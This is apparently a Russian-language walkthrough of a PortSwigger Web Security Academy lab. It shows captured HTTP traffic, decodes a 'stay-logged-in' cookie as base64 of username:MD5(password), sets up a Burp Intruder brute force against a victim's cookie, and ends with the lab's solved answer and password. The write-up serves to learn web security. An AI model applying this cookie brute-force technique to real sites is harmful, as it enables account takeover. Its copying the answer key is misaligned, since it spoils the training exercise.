
Лаборатория позволяет пользователям оставаться в системе даже после закрытия сеанса браузера. Файл cookie, используемый для обеспечения этой функции, уязвим для перебора.

## Вводные данные

- Наша учётка `wiener:peter`
- Имя жертвы `carlos`
- [Пароли кандидатов](https://portswigger.net/web-security/authentication/auth-lab-passwords)

# Разведка

- Так как дело связано с авторизацией то я сразу включу Burp

#### 1. При аутентификации есть вариант "оставаться в системе"

##### 1.1 Без включение данного варианта запрос выглядит
```
POST /login HTTP/2
Host: 0a890000049e065181b6e8af00e30008.web-security-academy.net
Cookie: session=XLoshpOEH7451LelyjdA4HSmMgkWLwqk; stay-logged-in=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a890000049e065181b6e8af00e30008.web-security-academy.net
Referer: https://0a890000049e065181b6e8af00e30008.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

username=wiener&password=peter
```
1.1.1 Переадрисация
```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=KzCnhWnUVIEzVMF498mmynZxiBdIL1zw; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

1.1.2 Ответ
```
GET /my-account?id=wiener HTTP/2
Host: 0a890000049e065181b6e8af00e30008.web-security-academy.net
Cookie: session=KH7En8J2rwmCJv10otYxsY2dbSYMnkyK; stay-logged-in=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a890000049e065181b6e8af00e30008.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```

##### 1.2 С включением данного функционала
```
POST /login HTTP/2
Host: 0a890000049e065181b6e8af00e30008.web-security-academy.net
Cookie: session=jKx9k5m3V5AgQidmZWqNwJi75m7kCDl3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://0a890000049e065181b6e8af00e30008.web-security-academy.net
Referer: https://0a890000049e065181b6e8af00e30008.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

username=wiener&password=peter&stay-logged-in=on
```
1.2.1 Переадрисация 
```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=tzePg9Dt8OmMk65ZYDMNvaj8b7FiG247; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
1.2.2 Ответ 
```
GET /my-account?id=wiener HTTP/2
Host: 0a890000049e065181b6e8af00e30008.web-security-academy.net
Cookie: session=twVYsfSXtzS3U239eFwQKpp9RL6N1CRV; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a890000049e065181b6e8af00e30008.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```

Итого что мы видим 
- `stay-logged-in=on` при вкл. функции и вообще нет если не вкл.
- `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` при вкл. функции запомнить меня

#### 2. Проверка функционал `stay-logged-in`

При проверке функционала выявлено что это кодировка Base64 и перевод 
из `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw` 
в `wiener:51dc30ddc473d43a6011e9ebba6ca770` 

Предположительно это мб какая то кодировка пароля, попробуем и её декодировать, chatgpt предположил что это MD5, проверим. И он прав **(не зная пароля можно использовать CrackStation)**
![[Pasted image 20250121124744.png]]

#### Итого

При "оставаться в системе" у нас появляется stay-logged-in он равен в кодировке base64 ( username:MD5(password) )

- Для авторизации нам нужно знать ник и пароль
- Обойти блокировку аккаунта при 3 неверных попыток блокировка 1 минута

# Атака

- Проверим есть ли защит от брута на stay-logged-in

1. По пути /my-account?id=жертва 
```
GET /my-account?id=wiener HTTP/2
Host: 0a890000049e065181b6e8af00e30008.web-security-academy.net
Cookie: session=twVYsfSXtzS3U239eFwQKpp9RL6N1CRV; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a890000049e065181b6e8af00e30008.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```
Мы в stay-logged начинаем брутить алгоритмом шифрования 
- При верных данных ответ 200 иначе 302 и переадресация на login
- кидаем в интрудер 
- Нам надо преобразовать в данные carlos:MD5password. 
	В intruder "Payload processing" 
	Hash->MD5 
	AddPrefix "carlos:"
	Encode base 64
![[Pasted image 20250121131712.png]]


# Ответ
![[Pasted image 20250121132020.png]]

Y2FybG9zOjA5ZjgzMTZlMjk2NDlhN2Y3OTVmNDE0YmEzODYwZmMw
carlos:09f8316e29649a7f795f414ba3860fc0
carlos:dallas


